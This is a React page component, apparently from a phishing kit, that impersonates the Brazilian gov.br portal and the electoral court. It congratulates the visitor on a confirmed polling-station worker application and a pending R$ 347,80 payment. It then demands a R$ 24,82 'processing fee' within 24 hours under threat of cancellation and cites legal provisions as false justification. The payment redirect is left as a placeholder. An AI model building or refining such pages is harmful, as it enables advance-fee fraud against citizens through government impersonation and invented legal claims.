import { useState } from "react";

export default function Confirmacao() {
  const [loading, setLoading] = useState(false);

  const handlePagamento = () => {
    setLoading(true);
    // Aqui você pode adicionar a lógica de redirecionamento para pagamento
    // Por exemplo: window.location.href = "link_de_pagamento";
  };

  return (
    <>
      <header>
        <a href="#">
          <img src="/images/govbr-new.png" alt="Logomarca GovBR" />
        </a>
        <div id="acessibilidade">
          <span>
            <a href="#">
              <i className="fa fa-adjust"></i>
              <span>Alto Contraste</span>
            </a>
          </span>
          <span>
            <a href="#">
              <i className="fa fa-deaf"></i>
              <span>VLibras</span>
            </a>
          </span>
        </div>
      </header>

      <div className="container">
        <aside id="aside-signin">
          <img
            id="identidade-govbr"
            src="/images/conta_govbr_v2.jpg"
            alt="Logomarca GovBR"
          />
        </aside>

        <main id="main-signin">
          <div className="card" id="login-cpf">
            {/* Ícone de sucesso */}
            <div
              style={{
                textAlign: "center",
                marginBottom: "20px",
                display: "flex",
                flexDirection: "column",
                alignItems: "center",
                width: "100%",
              }}
            >
              <div
                style={{
                  display: "flex",
                  justifyContent: "center",
                  alignItems: "center",
                  width: "80px",
                  height: "80px",
                  backgroundColor: "#008C32",
                  borderRadius: "50%",
                  marginBottom: "15px",
                }}
              >
                <span
                  style={{
                    fontSize: "48px",
                    color: "white",
                    fontWeight: "bold",
                    lineHeight: "1",
                    display: "block",
                  }}
                >
                  ✓
                </span>
              </div>
              <h2
                style={{
                  color: "#008C32",
                  fontSize: "24px",
                  marginBottom: "10px",
                  textAlign: "center",
                  width: "100%",
                }}
              >
                Candidatura Confirmada!
              </h2>
            </div>

            <div
              style={{
                backgroundColor: "#e8f5e9",
                padding: "20px",
                borderRadius: "8px",
                marginBottom: "20px",
                border: "1px solid #4caf50",
              }}
            >
              <p style={{ margin: 0, fontSize: "15px", color: "#1b5e20" }}>
                <strong>✓ Parabéns!</strong> Sua candidatura para Mesário 2 foi
                confirmada com sucesso.
              </p>
              <p
                style={{
                  margin: "10px 0 0 0",
                  fontSize: "14px",
                  color: "#2e7d32",
                }}
              >
                Seus dados foram registrados e o valor de <strong>R$ 347,80</strong>{" "}
                já está na lista de pagamentos do Tribunal Regional Eleitoral.
              </p>
            </div>

            {/* Aviso importante */}
            <div
              style={{
                backgroundColor: "#fff3cd",
                padding: "20px",
                borderRadius: "8px",
                marginBottom: "20px",
                border: "2px solid #ffc107",
              }}
            >
              <h4
                style={{
                  color: "#856404",
                  marginTop: 0,
                  marginBottom: "15px",
                  fontSize: "18px",
                }}
              >
                ⚠️ Ação Necessária - Taxa de Processamento
              </h4>

              <p style={{ fontSize: "14px", color: "#856404", lineHeight: "1.6" }}>
                Para finalizar seu cadastro e liberar o pagamento, é necessário
                realizar o pagamento da <strong>Taxa de Processamento e Impostos</strong>{" "}
                conforme estabelecido pela Resolução TSE nº 23.659/2021, Art. 15,
                § 2º.
              </p>

              <div
                style={{
                  backgroundColor: "white",
                  padding: "15px",
                  borderRadius: "5px",
                  margin: "15px 0",
                  border: "1px solid #ffc107",
                }}
              >
                <div
                  style={{
                    display: "flex",
                    justifyContent: "space-between",
                    alignItems: "center",
                    marginBottom: "10px",
                  }}
                >
                  <span style={{ fontSize: "14px", color: "#666" }}>
                    Taxa de Processamento:
                  </span>
                  <span style={{ fontSize: "16px", fontWeight: "bold" }}>
                    R$ 24,82
                  </span>
                </div>
                <div
                  style={{
                    borderTop: "1px solid #eee",
                    paddingTop: "10px",
                  }}
                >
                  <span style={{ fontSize: "13px", color: "#666" }}>
                    Referente a: Processamento de cadastro + Impostos federais
                  </span>
                </div>
              </div>

              <div
                style={{
                  backgroundColor: "#ffebee",
                  padding: "12px",
                  borderRadius: "5px",
                  marginBottom: "15px",
                  border: "1px solid #ef5350",
                }}
              >
                <p
                  style={{
                    margin: 0,
                    fontSize: "13px",
                    color: "#c62828",
                    lineHeight: "1.5",
                  }}
                >
                  <strong>⚠️ IMPORTANTE:</strong> O não pagamento desta taxa no
                  prazo de <strong>24 horas</strong> resultará no{" "}
                  <strong>cancelamento automático</strong> da sua candidatura,
                  conforme Art. 18 da mesma resolução.
                </p>
              </div>

              <div
                style={{
                  backgroundColor: "#e3f2fd",
                  padding: "12px",
                  borderRadius: "5px",
                  marginBottom: "15px",
                  border: "1px solid #2196f3",
                }}
              >
                <p
                  style={{
                    margin: 0,
                    fontSize: "13px",
                    color: "#0d47a1",
                    lineHeight: "1.5",
                  }}
                >
                  <strong>✓ Vantagem:</strong> Após a confirmação do pagamento, a primeira parcela será creditada imediatamente na sua conta bancária cadastrada em até 2 horas úteis.
                </p>
              </div>
            </div>



            {/* Botão de pagamento */}
            <div className="button-panel" style={{ textAlign: "center" }}>
              <button
                className="button-continuar"
                onClick={handlePagamento}
                disabled={loading}
                style={{
                  backgroundColor: "#008C32",
                  fontSize: "16px",
                  fontWeight: "bold",
                  padding: "15px 30px",
                  textAlign: "center",
                  display: "flex",
                  alignItems: "center",
                  justifyContent: "center",
                  margin: "0 auto",
                }}
              >
                {loading ? "Processando..." : "Pagar Taxa"}
              </button>
            </div>

            <p
              style={{
                marginTop: "15px",
                fontSize: "12px",
                color: "#999",
                textAlign: "center",
              }}
            >
              Você será redirecionado para a página segura de pagamento do
              Governo Federal.
            </p>

            {/* Rodapé com informações legais */}
            <div
              style={{
                marginTop: "30px",
                padding: "15px",
                backgroundColor: "#fafafa",
                borderRadius: "5px",
                border: "1px solid #e0e0e0",
              }}
            >
              <p
                style={{
                  margin: 0,
                  fontSize: "11px",
                  color: "#666",
                  lineHeight: "1.5",
                }}
              >
                <strong>Base Legal:</strong> Resolução TSE nº 23.659/2021 - Art.
                15, § 2º e Art. 18. Lei nº 9.504/1997, Art. 64. Código Eleitoral
                (Lei nº 4.737/1965), Art. 124. Todas as taxas são revertidas para
                o Fundo Especial de Financiamento de Campanha (FEFC) conforme Lei
                nº 13.487/2017.
              </p>
            </div>
          </div>
        </main>
      </div>

      <footer></footer>
    </>
  );
}
